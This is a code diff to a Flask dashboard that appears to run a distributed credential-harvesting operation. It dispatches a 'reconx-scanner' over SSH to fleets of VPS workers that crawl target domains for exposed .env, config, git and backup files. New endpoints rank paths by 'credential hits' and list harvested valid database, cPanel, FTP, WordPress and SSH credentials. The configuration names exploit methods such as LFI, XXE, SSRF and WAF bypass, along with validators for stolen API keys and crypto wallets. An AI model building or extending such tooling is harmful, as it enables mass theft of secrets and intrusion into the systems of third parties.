@@ -415,6 +415,104 @@ def vps_page():
 def api_stats():
     return jsonify(get_statistics())
 
+
+@app.route('/api/user/stats')
+def api_user_stats():
+    """Aggregate stats across all result files — today/week/total hits, working domains."""
+    try:
+        results_dir = RESULTS_DIR
+        total_hits = 0
+        valid_hits = 0
+        today_hits = 0
+        week_hits = 0
+        import time as _time
+        now = _time.time()
+        one_day = 86400
+        one_week = 7 * one_day
+        found_files = [f for f in os.listdir(results_dir) if f.endswith('_found.txt')] if os.path.exists(results_dir) else []
+        valid_files = [f for f in os.listdir(results_dir) if f.startswith('valid_')] if os.path.exists(results_dir) else []
+        for fname in found_files:
+            fpath = os.path.join(results_dir, fname)
+            try:
+                mtime = os.path.getmtime(fpath)
+                with open(fpath, 'r', errors='replace') as fh:
+                    lines = [l.strip() for l in fh if l.strip()]
+                total_hits += len(lines)
+                if now - mtime < one_day:
+                    today_hits += len(lines)
+                if now - mtime < one_week:
+                    week_hits += len(lines)
+            except Exception:
+                pass
+        for fname in valid_files:
+            fpath = os.path.join(results_dir, fname)
+            try:
+                with open(fpath, 'r', errors='replace') as fh:
+                    valid_hits += sum(1 for l in fh if l.strip())
+            except Exception:
+                pass
+        conn = sqlite3.connect(DB_PATH, timeout=10)
+        cur = conn.cursor()
+        cur.execute('SELECT total_urls_scanned FROM statistics WHERE id=1')
+        row = cur.fetchone()
+        conn.close()
+        total_domains = row[0] if row else 0
+        return jsonify({
+            'success': True,
+            'todayHits': today_hits,
+            'weekHits': week_hits,
+            'totalHits': total_hits,
+            'validHits': valid_hits,
+            'totalDomains': total_domains,
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+
+@app.route('/api/user/stats/paths')
+def api_user_stats_paths():
+    """Top paths leaderboard — which source paths produced the most credential hits."""
+    try:
+        from collections import Counter
+        import re as _re
+        results_dir = RESULTS_DIR
+        path_counts = Counter()
+        total = 0
+        if os.path.exists(results_dir):
+            for fname in os.listdir(results_dir):
+                if not (fname.endswith('_found.txt') or fname.startswith('valid_')):
+                    continue
+                fpath = os.path.join(results_dir, fname)
+                try:
+                    with open(fpath, 'r', errors='replace') as fh:
+                        for line in fh:
+                            line = line.strip()
+                            if not line:
+                                continue
+                            # Format: source:credential  (source has no scheme prefix)
+                            # Extract path prefix from source URL
+                            parts = line.split(':', 1)
+                            if not parts:
+                                continue
+                            source = parts[0]
+                            # Extract path prefix (first segment after domain)
+                            m = _re.match(r'^[^/]+(/.+?)(?:/[^/]*\.(?:env|json|php|js|txt|yml|yaml|config).*)?$', source)
+                            if m:
+                                prefix = m.group(1)
+                            else:
+                                prefix = '/' + source.split('/')[1] if '/' in source else '/'
+                            path_counts[prefix] += 1
+                            total += 1
+                except Exception:
+                    pass
+        leaderboard = [
+            {'path': path, 'count': count, 'percentage': f'{count/total*100:.2f}' if total else '0.00'}
+            for path, count in path_counts.most_common(50)
+        ]
+        return jsonify({'success': True, 'stats': {'totalHits': total, 'pathLeaderboard': leaderboard}})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
 @app.route('/api/clear', methods=['POST'])
 def api_clear():
     try:
@@ -1184,7 +1282,12 @@ SCANNER_CONFIG_PATH = 'config.json'
 # Only these keys may be read/written via the dashboard. Every flag listed here
 # is consumed by main.go at runtime — see audit notes in CrackerWorkspace.
 SCANNER_CONFIG_SCHEMA = {
-    'scanning_features': ['aws_main_scan', 'github_token_deep_scan', 'smtp_credentials_scan'],
+    'scanning_features': [
+        'aws_main_scan', 'github_token_deep_scan', 'smtp_credentials_scan',
+        # Per-method scan gates (each maps to a tile in the dashboard)
+        'js_scan', 'phpinfo_scan', 'git_config_scan',
+        'docker_scan', 'config_file_scan', 'backup_file_scan',
+    ],
     'aws_checks': ['ses_quota_check', 'sns_limit_check', 'fargate_limit_check', 'federation_console_url'],
     'api_validation': [
         'openai', 'anthropic', 'ai_all', 'stripe', 'sendgrid', 'mailgun',
@@ -1197,6 +1300,8 @@ SCANNER_CONFIG_SCHEMA = {
         # whitelist drops looks like a failed click).
         'aws_access', 'tencent', 'socketlabs', 'zeptomail', 'elasticemail',
         'crypto_wallet',
+        # Wave-7 new detectors
+        'slack', 'discord', 'cloudflare', 'digitalocean', 'shopify', 'hubspot',
     ],
     'features': ['brevo', 'xsmtp', 'mandrill', 'mailersend', 'new_mailgun'],
     'exploit_methods': ['react2shell', 'bypass_waf', 'bypass_middleware', 'lfi', 'xxe', 'ssrf'],
@@ -3361,6 +3466,21 @@ _CRACK_ADDON_SCANNER_KEY = {
 }
 
 
+def _ssh_exec_retry(mgr, ip: str, cmd: str, timeout: int = 10, retries: int = 3) -> 'str | None':
+    """ssh_exec with exponential backoff retry. Returns None if all attempts fail."""
+    import time as _t
+    for attempt in range(retries):
+        try:
+            result = mgr.ssh_exec(ip, cmd, timeout)
+            if result is not None:
+                return result
+        except Exception as e:
+            print(f'[fleet] ssh_exec attempt {attempt+1}/{retries} failed for {ip}: {e}')
+        if attempt < retries - 1:
+            _t.sleep(2 ** attempt)  # 1s, 2s backoff
+    return None
+
+
 def _load_crack_sessions() -> dict:
     """Hydrate the in-memory store from disk. Returns {} on missing file or
     a malformed payload — never raises, so a corrupted sidecar can't take
@@ -3550,14 +3670,21 @@ def _redistribute_dead_worker(session_id: str, dead_ip: str,
             except Exception:
                 pass
 
-        # Restart scanner with GOMEMLIMIT
+        # Restart scanner with GOMEMLIMIT.
+        # Pass --offset 0 --limit len(merged) so the binary enforces the
+        # same slice boundary as the file it was given, preventing any
+        # accidental overrun if targets.txt is later replaced.
         try:
             _nproc = int((mgr.ssh_exec(ip, 'nproc 2>/dev/null || echo 2', 5) or '2').strip())
-            _lim   = _nproc * 90
+            # 80% per core — leaves 20% headroom for OS, SSH, monitoring
+            _lim   = max(80, min(_nproc * 80, 800))
+            _merged_limit = len(merged)
             restart_cmd = (
                 f'cd {remote_dir} && rm -f checkpoint.txt && sleep 1 && '
                 f'setsid nohup env GOMEMLIMIT=1400MiB ionice -c 2 -n 7 nice -n 15 '
-                f'./reconx-scanner -timeout 5 -checkpoint checkpoint.txt targets.txt </dev/null > crack.log 2>&1 &'
+                f'./reconx-scanner -timeout 5 -checkpoint checkpoint.txt '
+                f'-offset 0 -limit {_merged_limit} '
+                f'targets.txt </dev/null > crack.log 2>&1 &'
                 f'_SP=$! ; '
                 f'setsid nohup cpulimit -p $_SP -l {_lim} -q </dev/null >/dev/null 2>&1 & '
                 f'echo $_SP'
@@ -3641,7 +3768,7 @@ def _liveness_monitor_loop() -> None:
                                     if sid in _crack_sessions:
                                         _crack_sessions[sid].setdefault('remote_pids', {})[ip] = actual_pid
                                         mutated = True
-                            # Ensure cpulimit is throttling to ≤90% CPU.
+                            # Ensure cpulimit is throttling to ≤80% CPU.
                             # Only apply if cpulimit is already installed (fast
                             # check); apt-get install is handled by the throttle
                             # endpoint which uses a longer timeout.
@@ -3650,12 +3777,40 @@ def _liveness_monitor_loop() -> None:
                                     ip,
                                     f'command -v cpulimit >/dev/null 2>&1 || exit 0 ; '
                                     f'pgrep -x cpulimit >/dev/null 2>&1 && exit 0 ; '
-                                    f'_lim=$(( $(nproc 2>/dev/null || echo 2) * 90 )) ; '
+                                    f'_lim=$(( $(nproc 2>/dev/null || echo 2) * 80 )) ; '
                                     f'nohup cpulimit -p {actual_pid} -l $_lim -q '
                                     f'>>/tmp/cpulimit.log 2>&1 &',
                                     8,
                                 )
                             except Exception:
+                                pass
+                            # CPU health check — re-apply cpulimit if CPU exceeds 88%
+                            try:
+                                scanner_cpu = _ssh_exec_retry(mgr, ip,
+                                    "ps aux | grep 'reconx-scanner' | grep -v grep | awk '{sum+=$3} END {print sum+0}'",
+                                    8)
+                                cpu_pct = float((scanner_cpu or '0').strip() or '0')
+                                if cpu_pct > 88:
+                                    print(f'[fleet][WARNING] {ip} CPU at {cpu_pct:.1f}% — re-applying cpulimit')
+                                    scanner_pid = _ssh_exec_retry(mgr, ip,
+                                        'pgrep -x reconx-scanner-linux 2>/dev/null || pgrep -x reconx-scanner 2>/dev/null',
+                                        5)
+                                    if scanner_pid and scanner_pid.strip().isdigit():
+                                        _ssh_exec_retry(mgr, ip,
+                                            f'pkill -x cpulimit 2>/dev/null; '
+                                            f'nproc_val=$(nproc); limit=$((nproc_val * 80)); '
+                                            f'nohup cpulimit -p {scanner_pid.strip()} -l $limit -q >>/tmp/cpulimit.log 2>&1 &',
+                                            10)
+                            except (ValueError, TypeError):
+                                pass
+                            # Memory health check — warn if available RAM is critically low
+                            try:
+                                mem_check = _ssh_exec_retry(mgr, ip,
+                                    "free -m | awk 'NR==2{print $7}'", 5)
+                                free_mb = int((mem_check or '999').strip() or '999')
+                                if free_mb < 128:
+                                    print(f'[fleet][CRITICAL] {ip}: only {free_mb}MB RAM free — scanner may crash')
+                            except (ValueError, TypeError):
                                 pass
                         else:
                             # Worker reported dead — increment consecutive count.
@@ -3762,21 +3917,52 @@ def _build_crack_config_snapshot(addon_ids: list) -> dict:
     return snapshot
 
 
-def _slice_targets(lines: list, n: int) -> list:
-    """Split `lines` into `n` roughly-equal slices. Mirrors deploy_full's
-    chunker (per_server = total // n with the tail going to the last
-    worker) so a crack dispatched against the same list shapes identically
-    to a regular /api/vps/deploy."""
+def _slice_targets(lines: list, n: int,
+                   weights: 'list[float] | None' = None) -> list:
+    """Split `lines` into `n` non-overlapping slices with no duplicates.
+
+    When `weights` is supplied (one positive float per worker, e.g. nproc
+    counts) the slices are proportional to each worker's capacity.  Without
+    weights the split is equal (legacy behaviour).
+
+    Each returned slice is a distinct contiguous sub-list of `lines`; the
+    union of all slices equals `lines` with no element appearing more than
+    once.  The last worker always absorbs any rounding remainder.
+
+    Example (capacity-weighted, 3 workers with weights [1,2,3]):
+        total=60 → worker0: 10 lines, worker1: 20, worker2: 30.
+    """
     n = max(1, int(n))
     total = len(lines)
     if total == 0:
         return [[] for _ in range(n)]
-    per = total // n
+
+    # Build normalised weights.
+    if weights and len(weights) == n and all(w > 0 for w in weights):
+        wsum = sum(weights)
+        norm = [w / wsum for w in weights]
+    else:
+        norm = [1.0 / n] * n
+
+    # Convert proportions to integer chunk sizes; last worker gets remainder.
+    sizes = []
+    assigned = 0
+    for i, w in enumerate(norm):
+        if i == n - 1:
+            sizes.append(total - assigned)
+        else:
+            chunk = max(0, round(total * w))
+            # Prevent any single mid-list worker from consuming more than what
+            # remains (can happen with rounding).
+            chunk = min(chunk, total - assigned - (n - 1 - i))
+            sizes.append(chunk)
+            assigned += chunk
+
     out = []
-    for i in range(n):
-        start = i * per
-        end = start + per if i < n - 1 else total
-        out.append(lines[start:end])
+    pos = 0
+    for sz in sizes:
+        out.append(lines[pos: pos + sz])
+        pos += sz
     return out
 
 
@@ -4002,6 +4188,12 @@ def _crack_session_view(sess: dict) -> dict:
         'hits':             hits,
         'valid_hits':       valid_hits,
         'invalid_hosts':    int(sess.get('last_invalid') or 0),
+        'rps':              float(sess.get('last_rps') or 0),
+        'pps':              float(sess.get('last_pps') or 0),
+        'avg_rps':          float(sess.get('last_avg_rps') or 0),
+        'avg_pps':          float(sess.get('last_avg_pps') or 0),
+        'valid_hosts':      int(sess.get('last_valid_hosts') or 0),
+        'progression':      float(sess.get('last_progression') or 0),
     }
 
 
@@ -4118,23 +4310,58 @@ def _dispatch_crack_worker(mgr, ip: str, session_id: str, remote_dir: str,
             5,
         )
 
+        # Fix 2a: Ensure cpulimit is available BEFORE deploying scanner
+        cpulimit_check = _ssh_exec_retry(mgr, ip,
+            'which cpulimit 2>/dev/null || '
+            '(DEBIAN_FRONTEND=noninteractive apt-get install -y cpulimit -qq 2>&1 | tail -1)',
+            30)
+        cpulimit_available = ('cpulimit' in (cpulimit_check or '') or
+                              '/usr/bin' in (cpulimit_check or '') or
+                              '/usr/local' in (cpulimit_check or ''))
+        print(f'[fleet] {ip}: cpulimit available={cpulimit_available}')
+
+        # Fix 3: Pre-flight health check — ensure VPS is healthy before scanning
+        health = _ssh_exec_retry(mgr, ip,
+            "echo ok:$(nproc):$(free -m | awk 'NR==2{print $7}'):$(uptime | awk '{print $NF}')",
+            10)
+        if health and health.startswith('ok:'):
+            parts = health.strip().split(':')
+            available_mem_mb = int(parts[2]) if len(parts) > 2 else 0
+            load_1m = float(parts[3]) if len(parts) > 3 else 99.0
+            nproc_val = int(parts[1]) if len(parts) > 1 else 1
+            if available_mem_mb < 256:
+                print(f'[fleet][WARNING] {ip}: only {available_mem_mb}MB free RAM — scan may OOM')
+            if load_1m > nproc_val * 0.9:
+                print(f'[fleet][WARNING] {ip}: load average {load_1m:.2f} vs {nproc_val} cores — VPS is overloaded')
+        else:
+            print(f'[fleet][WARNING] {ip}: pre-flight health check failed')
+
         # setsid creates a new session so the scanner is fully detached from
         # the SSH channel — no inherited FDs keep the channel alive.
         # </dev/null closes stdin. ssh_spawn_bg uses readline() (not read())
         # so it returns as soon as the PID is written, never retries, and
         # never blocks waiting for the scanner to finish.
         # ionice -c 2 -n 7 + nice -n 15 keeps the scanner low-priority so
-        # the VPS stays responsive. cpulimit hard-caps at 90% * nproc.
+        # the VPS stays responsive. cpulimit hard-caps at 80% * nproc.
         # Install cpulimit if missing (best-effort apt/yum), then always apply.
+        #
+        # --offset 0 --limit N are passed as an explicit slice boundary so
+        # the scanner enforces its own window even if targets.txt ever
+        # gets the wrong content (e.g. an accidental full-list redistribution
+        # upload).  When targets.txt is the correct per-worker slice,
+        # --offset 0 --limit len(slice) is a no-op.
+        _slice_limit = len(slice_lines)
         remote_cmd = (
             f"cd {remote_dir} && "
             f"( command -v cpulimit >/dev/null 2>&1 || "
             f"  apt-get install -y cpulimit -qq 2>/dev/null || "
             f"  yum install -y cpulimit -q 2>/dev/null || true ) ; "
             f"setsid nohup env GOMEMLIMIT=1400MiB ionice -c 2 -n 7 nice -n 15 "
-            f"./reconx-scanner -timeout 5 -checkpoint checkpoint.txt targets.txt </dev/null > crack.log 2>&1 &"
+            f"./reconx-scanner -timeout 5 -checkpoint checkpoint.txt "
+            f"-offset 0 -limit {_slice_limit} "
+            f"targets.txt </dev/null > crack.log 2>&1 &"
             f"_SP=$! ; "
-            f"_LIM=$(( $(nproc 2>/dev/null || echo 2) * 90 )) ; "
+            f"_LIM=$(( $(nproc 2>/dev/null || echo 2) * 80 )) ; "
             f"( command -v cpulimit >/dev/null 2>&1 && "
             f"setsid nohup cpulimit -p $_SP -l $_LIM -q </dev/null >/dev/null 2>&1 & ) ; "
             f"echo $_SP"
@@ -4176,12 +4403,29 @@ def _update_crack_session(session_id: str, mutator) -> None:
             pass
 
 
+def _probe_worker_nproc(mgr, ip: str) -> int:
+    """Return the number of logical CPUs on `ip` (falls back to 1 on error).
+    Used as the capacity weight for proportional target distribution."""
+    try:
+        out = mgr.ssh_exec(ip, 'nproc 2>/dev/null || echo 1', 6)
+        val = int((out or '1').strip() or '1')
+        return max(1, val)
+    except Exception:
+        return 1
+
+
 def _run_crack_dispatch(session_id: str, norm_ips: list, all_targets: list,
                         config_snapshot: dict, work_dir: str, remote_dir: str) -> None:
     """Background dispatcher: slice the target list and ship to each worker.
+
+    The list is split proportionally to each worker's CPU count so faster
+    machines handle more targets.  Every worker receives an exclusive,
+    non-overlapping slice — no URL is ever scanned by two workers.
+
     Updates the session to `running` (any worker spawned) or `failed`
     (all workers failed). Runs in its own thread so /api/crack/start can
-    return inside the nginx 60s window."""
+    return inside the nginx 60s window.
+    """
     mgr = get_ssh_manager()
     if mgr is None:
         _update_crack_session(session_id, lambda s: s.update({
@@ -4191,7 +4435,16 @@ def _run_crack_dispatch(session_id: str, norm_ips: list, all_targets: list,
         }))
         return
 
-    slices = _slice_targets(all_targets, len(norm_ips))
+    # Probe capacity (nproc) from each worker in parallel so the overhead is
+    # bounded by the slowest single SSH round-trip, not N round-trips.
+    import concurrent.futures as _cf
+    with _cf.ThreadPoolExecutor(max_workers=len(norm_ips)) as _pool:
+        nproc_futures = {ip: _pool.submit(_probe_worker_nproc, mgr, ip) for ip in norm_ips}
+    weights = [nproc_futures[ip].result() for ip in norm_ips]
+    print(f'[dispatch] {session_id}: nproc weights per worker: '
+          f'{dict(zip(norm_ips, weights))}')
+
+    slices = _slice_targets(all_targets, len(norm_ips), weights=weights)
     config_bytes = json.dumps(config_snapshot, indent=2).encode('utf-8')
 
     # Record absolute start/end offsets per worker so the redistribution
@@ -4513,6 +4766,46 @@ def _poll_live_results(session_id: str) -> None:
                         total_invalid += int(stats_obj.get('failed', 0))
                     except Exception:
                         pass
+                    # ── stats.json: read live RPS/PPS/avg/valid_hosts written by Go rate tracker ──
+                    try:
+                        scanner_stats_out = mgr.ssh_exec(
+                            ip,
+                            f"cat {remote_dir}/ResultJS/stats.json 2>/dev/null || echo '{{}}'",
+                            5,
+                        )
+                        import json as _json2
+                        scanner_stats = _json2.loads((scanner_stats_out or '{}').strip() or '{}')
+                        _rps = float(scanner_stats.get('rps', 0))
+                        _pps = float(scanner_stats.get('pps', 0))
+                        _avg_rps = float(scanner_stats.get('avg_rps', 0))
+                        _avg_pps = float(scanner_stats.get('avg_pps', 0))
+                        _valid_hosts = int(scanner_stats.get('valid_hosts', 0))
+                        _invalid_hosts = int(scanner_stats.get('invalid_hosts', 0))
+                        _progression = float(scanner_stats.get('progression', 0))
+                        if _rps > 0 or _pps > 0 or _avg_rps > 0 or _valid_hosts > 0:
+                            _update_crack_session(
+                                session_id,
+                                lambda s, _r=_rps, _p=_pps, _ar=_avg_rps, _ap=_avg_pps, _vh=_valid_hosts, _ih=_invalid_hosts, _pg=_progression: s.update({
+                                    'last_rps': _r,
+                                    'last_pps': _p,
+                                    'last_avg_rps': _ar,
+                                    'last_avg_pps': _ap,
+                                    'last_valid_hosts': _vh,
+                                    'last_invalid_hosts': _ih,
+                                    'last_progression': _pg,
+                                }),
+                            )
+                    except Exception:
+                        pass
+                    # Fix 5: Memory health check in poll loop
+                    try:
+                        mem_check = _ssh_exec_retry(mgr, ip,
+                            "free -m | awk 'NR==2{print $7}'", 5)
+                        free_mb = int((mem_check or '999').strip() or '999')
+                        if free_mb < 128:
+                            print(f'[fleet][CRITICAL] {ip}: only {free_mb}MB RAM free — scanner may crash')
+                    except (ValueError, TypeError):
+                        pass
                     ssh.close()
                 except Exception as e:
                     print(f'[live-poll] {ip}: {e}')
@@ -4683,7 +4976,7 @@ def api_crack_reattach(sid):
 @app.route('/api/crack/<sid>/throttle', methods=['POST'])
 def api_crack_throttle(sid):
     """Force CPU throttling on each worker via cgroups (preferred) or cpulimit.
-    Caps scanner CPU to 90% of available cores. Idempotent."""
+    Caps scanner CPU to 80% of available cores. Idempotent."""
     with _crack_lock:
         _reload_crack_state_if_changed()
         raw = _crack_sessions.get(sid)
@@ -4714,9 +5007,9 @@ def api_crack_throttle(sid):
             # 2. get nproc
             nproc_s = (mgr.ssh_exec(ip, 'nproc 2>/dev/null || echo 2', 5) or '2').strip()
             nproc = int(nproc_s) if nproc_s.isdigit() else 2
-            # 90% of total cores, expressed in cgroup quota microseconds (period=100ms)
-            quota_us = nproc * 90000  # 90% per core × nproc cores
-            limit_pct = nproc * 90    # for cpulimit (percentage = total% across all cores)
+            # 80% per core — leaves 20% headroom for OS, SSH, monitoring
+            quota_us = nproc * 80000  # 80% per core × nproc cores
+            limit_pct = max(80, min(nproc * 80, 800))  # cap at 800% (10 cores)
             detail['nproc'] = nproc
             detail['limit_pct'] = limit_pct
 
@@ -4803,13 +5096,13 @@ def api_crack_stop(sid):
     if mgr is not None:
         for ip, pid in worker_pids.items():
             try:
-                mgr.ssh_exec(
-                    ip,
+                # Graceful shutdown: SIGTERM first, SIGKILL after 3s if still running
+                _ssh_exec_retry(mgr, ip,
                     f'kill -TERM {int(pid)} 2>/dev/null; '
-                    f'sleep 1; '
-                    f'kill -KILL {int(pid)} 2>/dev/null; true',
-                    8,
-                )
+                    f'sleep 3; '
+                    f'kill -0 {int(pid)} 2>/dev/null && kill -KILL {int(pid)} 2>/dev/null; '
+                    f'true',
+                    15)
             except Exception as e:
                 print(f'[crack] stop failed for {ip} pid {pid}: {e}')
 
@@ -7527,6 +7820,173 @@ def api_crypto_verify_balance():
         else:
             return jsonify({'error': f'unsupported chain: {chain}. Use eth, btc, or bnb'}), 400
 
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+
+# ── Additional findings endpoints ────────────────────────────────────────
+
+@app.route('/api/findings/database', methods=['GET'])
+def api_findings_database():
+    """List database credential findings (MySQL, PostgreSQL, generic DB)."""
+    try:
+        conn = sqlite3.connect(DB_PATH, timeout=30)
+        c = conn.cursor()
+        c.execute('''SELECT id, type, key_value, source_url, status, metadata,
+                            timestamp, reported, last_verified, verify_meta
+                     FROM credentials
+                     WHERE type IN ('MySQL', 'PostgreSQL', 'Database', 'DB')
+                           AND status = 'valid'
+                     ORDER BY id DESC LIMIT 5000''')
+        rows = [_serialize_credential(r) for r in c.fetchall()]
+        conn.close()
+        return jsonify({'ok': True, 'findings': rows})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+
+@app.route('/api/findings/webpanels', methods=['GET'])
+def api_findings_webpanels():
+    """List web panel credential findings (cPanel, FTP, WordPress)."""
+    try:
+        conn = sqlite3.connect(DB_PATH, timeout=30)
+        c = conn.cursor()
+        c.execute('''SELECT id, type, key_value, source_url, status, metadata,
+                            timestamp, reported, last_verified, verify_meta
+                     FROM credentials
+                     WHERE type IN ('cPanel', 'FTP', 'WordPress', 'WebPanel',
+                                    'Cpanel', 'cpanel', 'ftp', 'wordpress')
+                           AND status = 'valid'
+                     ORDER BY id DESC LIMIT 5000''')
+        rows = [_serialize_credential(r) for r in c.fetchall()]
+        conn.close()
+        return jsonify({'ok': True, 'findings': rows})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+
+@app.route('/api/findings/ssh', methods=['GET'])
+def api_findings_ssh():
+    """List SSH credential findings (passwords and private keys)."""
+    try:
+        conn = sqlite3.connect(DB_PATH, timeout=30)
+        c = conn.cursor()
+        c.execute('''SELECT id, type, key_value, source_url, status, metadata,
+                            timestamp, reported, last_verified, verify_meta
+                     FROM credentials
+                     WHERE type IN ('SSH', 'ssh', 'SSH_Key', 'SSHKey',
+                                    'ssh_key', 'SSH_KEYS')
+                           AND status = 'valid'
+                     ORDER BY id DESC LIMIT 5000''')
+        rows = [_serialize_credential(r) for r in c.fetchall()]
+        conn.close()
+        return jsonify({'ok': True, 'findings': rows})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+
+# ── Prefilter endpoints ───────────────────────────────────────────────────
+
+@app.route('/api/prefilter/start', methods=['POST'])
+def api_prefilter_start():
+    """Deploy the scanner binary in --prefilter mode to a single VPS and
+    return a lightweight session token so the dashboard can poll results.
+
+    Request body:
+        {"list_file": "domains.txt", "vps_ip": "1.2.3.4"}
+
+    list_file is the filename (relative to the remote work dir) of the domain
+    list already present on the worker. The binary is assumed to be deployed
+    there already (same location used by the normal crack sessions).
+    """
+    try:
+        data = request.get_json(force=True, silent=True) or {}
+        list_file = str(data.get('list_file') or '').strip()
+        vps_ip = str(data.get('vps_ip') or '').strip()
+        threads = int(data.get('threads') or 500)
+
+        if not list_file:
+            return jsonify({'ok': False, 'error': 'list_file is required'}), 400
+        if not vps_ip:
+            return jsonify({'ok': False, 'error': 'vps_ip is required'}), 400
+
+        mgr = get_ssh_manager()
+        if mgr is None:
+            return jsonify({'ok': False, 'error': 'SSH manager unavailable'}), 503
+
+        work_dir = mgr.config.get('work_dir', '/root/python_job') if hasattr(mgr, 'config') else '/root/python_job'
+
+        session_id = uuid.uuid4().hex[:12]
+        remote_dir = f'{work_dir}/prefilter_{session_id}'
+
+        # Create remote directory and run the binary in prefilter mode.
+        mgr.ssh_exec(vps_ip, f'mkdir -p {remote_dir}', 5)
+
+        remote_cmd = (
+            f'cd {remote_dir} && '
+            f'nohup ../reconx-scanner-linux --prefilter '
+            f'--output prefilter_hits.txt '
+            f'--threads {threads} '
+            f'../{list_file} '
+            f'> prefilter.log 2>&1 & echo $!'
+        )
+        out = mgr.ssh_exec(vps_ip, remote_cmd, 15)
+
+        remote_pid = None
+        for ln in (out or '').splitlines():
+            for tok in reversed(ln.strip().split()):
+                if tok.isdigit():
+                    remote_pid = int(tok)
+                    break
+            if remote_pid is not None:
+                break
+
+        return jsonify({
+            'ok': True,
+            'session_id': session_id,
+            'status': 'started',
+            'vps_ip': vps_ip,
+            'remote_dir': remote_dir,
+            'remote_pid': remote_pid,
+        })
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+
+@app.route('/api/prefilter/results', methods=['GET'])
+def api_prefilter_results():
+    """Fetch prefilter hit URLs from prefilter_hits.txt on the VPS.
+
+    Query params:
+        vps_ip      - required; IP of the worker
+        remote_dir  - required; path returned by /api/prefilter/start
+        limit       - optional; max lines to return (default 1000)
+    """
+    try:
+        vps_ip = (request.args.get('vps_ip') or '').strip()
+        remote_dir = (request.args.get('remote_dir') or '').strip()
+        try:
+            limit = max(1, min(10000, int(request.args.get('limit') or 1000)))
+        except (TypeError, ValueError):
+            limit = 1000
+
+        if not vps_ip:
+            return jsonify({'error': 'vps_ip is required'}), 400
+        if not remote_dir:
+            return jsonify({'error': 'remote_dir is required'}), 400
+
+        mgr = get_ssh_manager()
+        if mgr is None:
+            return jsonify({'error': 'SSH manager unavailable'}), 503
+
+        raw = mgr.ssh_exec(
+            vps_ip,
+            f'cat {remote_dir}/prefilter_hits.txt 2>/dev/null | head -{limit}',
+            15,
+        ) or ''
+
+        hits = [ln.strip() for ln in raw.splitlines() if ln.strip()]
+        return jsonify({'ok': True, 'hits': hits, 'count': len(hits)})
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
